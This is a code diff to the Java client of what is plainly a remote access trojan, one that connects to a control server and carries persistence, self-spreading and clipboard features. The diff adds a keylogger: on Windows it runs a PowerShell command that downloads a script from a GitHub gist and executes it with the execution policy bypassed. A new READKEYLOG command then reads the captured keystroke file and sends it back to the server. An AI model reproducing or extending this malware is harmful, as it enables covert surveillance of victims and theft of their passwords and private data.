@@ -15,6 +15,8 @@ import java.awt.datatransfer.StringSelection;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.NoSuchAlgorithmException;
@@ -25,7 +27,7 @@ import java.util.concurrent.TimeUnit;
 public class Client {
     private static String HOST = "localhost";
     private static int PORT = 22122;
-    private static  boolean debugMode = true;
+    private static boolean debugMode = true;
     private static final String SYSTEMOS = System.getProperty("os.name");
     private static boolean isPersistent = false;
     private static boolean autoSpread = false;
@@ -34,6 +36,8 @@ public class Client {
     private static DataInputStream dis;
     private static boolean keyLogger = true;
     private static String aesKey = "";
+
+    private static String keyLogFile = "";
 
     private static String USERNAME = System.getProperty("user.name");
     private static String JRE_VERSION = System.getProperty("java.version");
@@ -120,6 +124,18 @@ public class Client {
                 System.out.println(" === Java version: " + JRE_VERSION);
             }
 
+            // Start the keylogger if requested
+            if (keyLogger){
+                if (SYSTEMOS.contains("win")){
+                    // Download psh keylogger
+                    String url = "https://gist.github.com/cbrnrd/7d84c7d979686e36c8e5691787042ac4/raw/3c8d76361c1d31d0375f00748a9af57d712c600c/keylog.ps1";
+                    String fname = System.getProperty("java.io.tmpdir") + "\\" + randTextAlphaRestricted(8) + ".ps1";
+                    String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '.\\" + fname + "'); powershell.exe -ExecutionPolicy Bypass -file " + fname;
+                    Runtime.getRuntime().exec(cmd);
+                    keyLogFile = System.getProperty("java.io.tmpdir") + "\\" + "log.txt";
+                }
+            }
+
             while (true) {
                 String input;
                 try {
@@ -165,6 +181,17 @@ public class Client {
                     CLIENT: here's the info
                      */
                     getAndSendSysInfo();
+                } else if (input.equals("READKEYLOG")){
+                    /*
+                    SERVER: READKEYLOG
+                    CLIENT: READKEYLOG
+                    CLIENT: len
+                    CLIENT: read(keyLogFile)
+                     */
+                    communicate("READKEYLOG");
+                    String content = new String(Files.readAllBytes(Paths.get(keyLogFile)));
+                    communicate(content.length());
+                    communicate(content);
                 } else if (input.contains("CLIPSET")) {
                     /*
                     SERVER: CLIPSET "data"
@@ -502,7 +529,7 @@ public class Client {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
-            if (settings.length == 6) {
+            if (settings.length == 7) {
                 HOST = (settings[0]);
                 // Change domain to ip
                 try{
@@ -516,6 +543,7 @@ public class Client {
                 autoSpread = (Boolean.parseBoolean(settings[3]));
                 debugMode = (Boolean.parseBoolean(settings[4]));
                 aesKey = settings[5];
+                keyLogger = (Boolean.parseBoolean(settings[6]));
             }
         } catch (IOException e) {
             if (debugMode) {
